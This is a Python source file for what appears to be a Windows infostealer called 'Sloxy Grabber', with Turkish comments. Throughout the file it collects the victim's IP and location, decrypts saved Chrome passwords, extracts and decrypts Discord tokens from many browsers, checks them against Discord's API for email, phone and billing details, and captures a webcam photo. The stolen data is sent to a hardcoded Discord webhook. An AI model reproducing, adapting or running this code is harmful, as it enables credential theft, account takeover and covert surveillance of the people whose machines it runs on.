import requests
import os
import json
import os
from sys import executable
from sqlite3 import connect as sql_connect
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
from zipfile import ZipFile
import os
import sqlite3
import json
from win32crypt import CryptUnprotectData
from base64 import b64decode
from Crypto.Cipher import AES as AE
from shutil import copy2
from discord_webhook import *
import os
import json
import sqlite3
from sys import argv
from PIL import ImageGrab
from base64 import b64decode
from tempfile import mkdtemp
from re import findall, match
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import os
import json
import sqlite3
from sys import argv
from PIL import ImageGrab
from base64 import b64decode
from tempfile import mkdtemp
from re import findall, match
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
import cv2
import io

webhook_url = "https://discord.com/api/webhooks/1182707896807587950/caNoXQarMaPeKuoxuv7wj3bbQ_b2bcxQfKve5wntS0du6Znd88kt1Wsyz18waQWdLSQf"

# İP - COUNTRY-----------------------------

ipget = requests.get("https://api.ipify.org")
ip = ipget.text

computer_name = os.environ['COMPUTERNAME']

urlipget = f'http://ip-api.com/json/{ip}'
ipcitysorgu = requests.get(urlipget)

if ipcitysorgu.status_code == 200:
    data = ipcitysorgu.json()
    ulkeip = data["country"]
    ulkekodip = data["countryCode"]
    sehirisimip = data["regionName"]

flagkucuk = ulkekodip
flag = flagkucuk.lower()

# İP - COUNTRY SEND TO WEBHOOK-----------------------------------------------


payload = {
    'content': f'Bilgisayar Adı - **{computer_name}** -  İP - **{ip}** -  Country - **{ulkeip} :flag_{flag}:** - Country Code - **{ulkekodip}** - City Name - **{sehirisimip}**'
}

json_payload = json.dumps(payload)

response = requests.post(webhook_url, data=json_payload, headers={'Content-Type': 'application/json'})
if response.status_code == 204:
    print("Succesful Send D@ta")
else:
    print("Not Send D@ta")

# PASSWORD PASTE--------------------------------

local = os.getenv("LOCALAPPDATA")
google_paths = [
    local + '\\Google\\Chrome\\User Data\\Default',
    local + '\\Google\\Chrome\\User Data\\Profile 1',
    local + '\\Google\\Chrome\\User Data\\Profile 2',
    local + '\\Google\\Chrome\\User Data\\Profile 3',
    local + '\\Google\\Chrome\\User Data\\Profile 4',
    local + '\\Google\\Chrome\\User Data\\Profile 5',
]


def heck():
    def mk():
        with open(local + '\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    masterkey = mk()

    def decode_password(buffer, master_key):
        try:
            bufiv, payload = buffer[3:15], buffer[15:]
            cipher = AE.new(master_key, AE.MODE_GCM, bufiv)
            decoded = cipher.decrypt(payload)[:-16].decode()
            return decoded
        except:
            return "No Passwords Fount"

    def passwords():
        with open(f"\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt", "w", encoding="utf-8") as f:
            f.write(" <-----    SLOXY GRABBER  ----->\n\n")

        for path in google_paths:
            path += '\\Login Data'
            if os.path.exists(path):
                copy2(path, "logins.db")
                db = sqlite3.connect("logins.db")
                cmd = db.cursor()
                with open(f"\\Users\\{os.getlogin()}\\AppData\\Local\\Google.txt", "a", encoding="utf-8") as f:

                    for result in cmd.execute("SELECT action_url, username_value, password_value FROM logins"):

                        url, username, password = result
                        password = decode_password(password, masterkey)
                        if url and username and password != "":

                            if username is None:
                                username = "N/A"
                            f.write(
                                "USER: {:<30} | PASS: {:<30} | URL: {:<30}\n".format(
                                    username, password, url))

    passwords()
    w = DiscordWebhook(url=webhook_url, username="Sloxy Grabber", avatar_url="https://cdn.discordapp.com/avatars/1181996130142261340/ffca2ff8f175e521edbc245a4ec92673.webp?size=80")
    with open(local + "\\Google.txt", "rb") as f:
        w.add_file(file=f.read(), filename=f'Passwords-{computer_name}.txt')
        w.execute()


if __name__ == '__main__':
    heck()

# TOKEN PASTE -------------------------------------------------


tokens = []
cleaned = []
checker = []


def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(
            buff[15:])[:-16].decode()
    except:
        return "Error"


def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def send_photo_to_discord_webhook(file_path):
    # Discord webhook URL'si (Webhook URL'si buraya gelecek)
    webhook_url = "DISCORD_WEBHOOK_URL"

    # Fotoğraf dosyasını aç
    with open(file_path, 'rb') as file:
        # Discord webhook'a gönderilecek dosya verisi
        file_data = io.BytesIO(file.read())

    # Discord webhook'a dosya gönder
    files = {'file': ('webcam.png', file_data)}
    response = requests.post(webhook_url, files=files)

    # Yanıtı kontrol et
    if response.status_code == 204:
        print("Fotoğraf başarıyla Discord'a gönderildi!")
    else:
        print("Fotoğraf gönderilemedi. Hata:", response.text)

def get_webcam():
    # Webcam'den fotoğraf çek
    webcam = cv2.VideoCapture(0)
    ret, frame = webcam.read()
    webcam.release()

    # Fotoğrafı bellekte geçici bir dosyaya kaydet
    file_path = "webcam.png"
    cv2.imwrite(file_path, frame)

    # Discord webhook'a fotoğrafı gönder
    send_photo_to_discord_webhook(file_path)

    # Dosyayı sil (isteğe bağlı, eğer saklamak istemiyorsan)
    # import os
    # os.remove(file_path)

if __name__ == '__main__':
    get_webcam()

def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except:
            continue
        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
            if not file.endswith(".ldb") and file.endswith(".log"):
                continue
            else:
                try:
                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                tokens.append(values)
                except PermissionError:
                    continue
        for i in tokens:
            if i.endswith("\\"):
                i.replace("\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error":
                continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except:
                        continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = ipget.text
                        pc_username = os.getenv("UserName")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions',
                                           headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0],
                                                   "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0],
                                                   "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        now = datetime.now()
                        saat = now.strftime("%H:%M:%S")
                        embed = f"""**{user_name} - [ {saat} ]**\n-   **Account Information**\n**Email <a:saggok:1084596390434451507> ** `{email}`\n**Phone <a:saggok:1084596390434451507> ** `{phone}`\n**2FA/MFA Enabled <a:saggok:1084596390434451507> ** `{mfa_enabled}`\n**Nitro <a:saggok:1084596390434451507> ** `{has_nitro}`\n**Expires in <a:saggok:1084596390434451507> ** `{days_left if days_left else "None"} day(s)`\n-   **PC Information**\n**IP <a:saggok:1084596390434451507> ** `{ip}`\n**Username <a:saggok:1084596390434451507> ** `{pc_username}`\n**PC Name <a:saggok:1084596390434451507> ** `{computer_name}`\n**Platform <a:saggok:1084596390434451507> ** `{platform}`\n-   **Token** <a:saggok:1084596390434451507> `{tok}`\n
"""
                        payload = json.dumps({'content': embed, 'username': 'Sloxy Grabber',
                                              'avatar_url': 'https://cdn.discordapp.com/avatars/1181996130142261340/ffca2ff8f175e521edbc245a4ec92673.webp?size=80'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request(webhook_url, data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except:
                            continue
                else:
                    continue


if __name__ == '__main__':
    get_token()

# FİNİSH -------
